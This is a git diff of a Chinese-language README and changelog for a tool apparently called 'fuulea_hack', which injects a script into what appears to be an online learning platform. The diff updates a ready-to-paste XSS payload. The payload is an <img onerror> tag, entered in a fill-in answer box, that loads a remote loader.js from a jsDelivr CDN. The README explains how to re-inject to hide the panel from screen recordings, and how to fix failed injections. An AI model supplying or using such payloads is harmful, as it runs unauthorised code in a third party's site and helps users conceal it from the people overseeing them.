@@ -7,10 +7,10 @@
 贴进「注释填空」的输入框，随便答错提交：
 
 ```html
-<img src=x onerror="with(document)body.appendChild(createElement('script')).src='https://fastly.jsdelivr.net/gh/zhaoqinhao123/fuulea_hack@3.13.1/loader.js'">
+<img src=x onerror="with(document)body.appendChild(createElement('script')).src='https://fastly.jsdelivr.net/gh/zhaoqinhao123/fuulea_hack@3.14/loader.js'">
 ```
 
-157 字符，输入框没有长度限制，直接粘贴即可。面板出现在右下角。**再注入一次就是隐形开关**：面板开着时注入 → 整块隐藏；再注入 → 显形。藏起来时页面里只剩你原本的内容，录屏、投屏都不留痕迹。
+155 字符，输入框没有长度限制，直接粘贴即可。面板出现在右下角。**再注入一次就是隐形开关**：面板开着时注入 → 整块隐藏；再注入 → 显形。藏起来时页面里只剩你原本的内容，录屏、投屏都不留痕迹。
 
 > 注入串必须带 `https:` 协议。v3.2.1 及更早的 README 示例是不带协议的 `//fastly...`，页面本身用 `file://` 打开时，浏览器会把 `//fastly.jsdelivr.net/...` 解析成 `file://fastly.jsdelivr.net/...`，于是报 `net::ERR_FILE_NOT_FOUND`，插件根本不加载。
 
@@ -33,12 +33,28 @@
 按这几条自查（v3.13.1 起面板会自己报警）：
 
 1. **页面已经开过面板**：再注入一次是「隐藏 / 显形」的开关（设计如此），不会把已加载的旧代码换成新代码。要升级必须**先刷新页面**（F5 / 下拉刷新）让面板消失，再贴注入串。
-2. **版本号对不上**：注入串里的 `@3.13.1` 要和仓库最新 tag 一致（工具 → 🔄 版本更新 → 查询最新版，会自动生成正确串）。
+2. **版本号对不上**：注入串里的 `@3.14` 要和仓库最新 tag 一致（工具 → 🔄 版本更新 → 查询最新版，会自动生成正确串）。
 3. **CDN 打不开**：`fastly.jsdelivr.net` 在部分网络会被重置。把串里的 `fastly` 换成 `cdn` 或 `gcore` 再试；三者都不通就换网络。
 4. **44 字符短串没反应**：短串读的是 `localStorage.fhL`，只在**同一个浏览器、同一个站点、且这台机器此前成功注入过一次**时有效。换浏览器、清过缓存、换了域名（`file://` ↔ `https://`）之后都必须先贴一次长串。
 5. **页面把 HTML 转义了**：面板不出现时按 F12 看 Console，有没有 `Refused to load the script` / `net::ERR_...`。
 
 v3.13.1 起，若注入的是新版本而页面还跑着旧版本，面板会直接弹提示「注入的是 v3.13.1，页面还跑着 v3.13：刷新页面（F5）后再注入一次」，不会再静默地什么也不发生。
+
+## v3.14
+
+- **相册修好了，并能直接往聊天室发**：根因是 `mods/ai.js` 和 `mods/music.js` 共用 `fh_media`，音乐模块先把它升到 v2 且只建 `blob/meta/zip`，相册再按 v1 打开就报 `VersionError`，而错误被静默吞掉。现在相册单独用 `fh_album` v1，并在首次打开时把旧 `fh_media` 里已有的 `media` 记录**复制**过来；旧库只读、不升级、不删除。聊天室输入行新增 🖼：全屏相册（全部 / 图片 / 视频、多选、可选「发送前压缩图片」），选完直接上传成消息。
+- **拍照 / 录像自动存相册**：聊天室相机、AI 网页相机、相机 / 本地媒体页拍完/录完都会先写进 `fh_album`，再预览或发送；即使不发送，也能从相册里找回。
+- **相机改成「先预览、再发送」**：📷 顶部有「拍照 / 录像」明确切换，单快门；拍完先看预览，可选「重拍 / 完成 / 发送」。发送成功后预览关闭、相机不关，可以接着拍；发送失败留在预览页，可直接重试。相册 / 本地媒体页仍保持原来的「拍完立即回调」行为。
+- **思考档位改成英文 7 档**：`Default / none / low / medium / high / xhigh / max`；`Default` 表示**完全不传** `reasoning` / `thinking` / `reasoning_effort`，由接口自己决定。Responses 用 `reasoning.effort`；DeepSeek 官方 Chat 用 `thinking` + `reasoning_effort`；第三方 Chat 只传 `reasoning_effort`。接口因思考参数报 400 时自动去掉这些字段重试一次。
+- **中转站模型获取 / 发送修复**：oi-debug 只支持 Responses，AMD 两种协议都支持；以前固定按 Chat 发、且浏览器被 CORS 拦。现在：
+  - 设置里新增「CORS 代理」（键 `fh:ai:proxy`），支持 `{url}` 模板或 `?url=` 前缀；
+  - 协议默认「自动」：先试 Chat，遇到 404/405 / “不支持 / 仅提供 Responses” 自动改试 Responses，并记住该地址的实际协议；
+  - 模型扫描会依次尝试 `/models`、`/v1/models` 等候选地址，兼容 `data` / `models` / `data.models` 返回；
+  - 聊天、扫描、API 探测都走代理；错误为 0 时直接提示是 CORS 并建议填代理。
+- **免费 CORS 代理（Cloudflare Worker）**：新增 `tools/cors-worker.js`。Cloudflare 控制台 → Workers & Pages → Create Worker → 粘贴代码 → Deploy，把 `https://xxx.workers.dev` 填进「CORS 代理」即可；不用 VPS、不用常开电脑、不用信用卡，Key 只透传不落盘。默认只允许 `oi-debug.mywwzh.top` / `developer.amd.com.cn` / `api.deepseek.com`，可用环境变量 `ALLOW_HOSTS` 扩展；`workers.dev` 在国内不稳时给 Worker 绑自定义域名。也可以本机 `node proxy.js`（默认 8787，支持 POST / Authorization / SSE 流式）作为备用。
+- **聊天输入框固定两行内滚动**：聊天室与 AI 网页输入框都改成 `rows=2`，最小 54px、最高 96px，超出内部滚动，不再把整个窗口顶高。
+- **聊天室去掉长状态行**：输入框上方只保留「已登录 用户名」，删掉「消息写入 GitLab message/ · 30 秒自动刷新 · …」那行。
+- 版本号 `TAG` / AI 头栏 / 聊天室徽标 / 主面板标签统一升到 3.14。
 
 ## v3.13.1
 
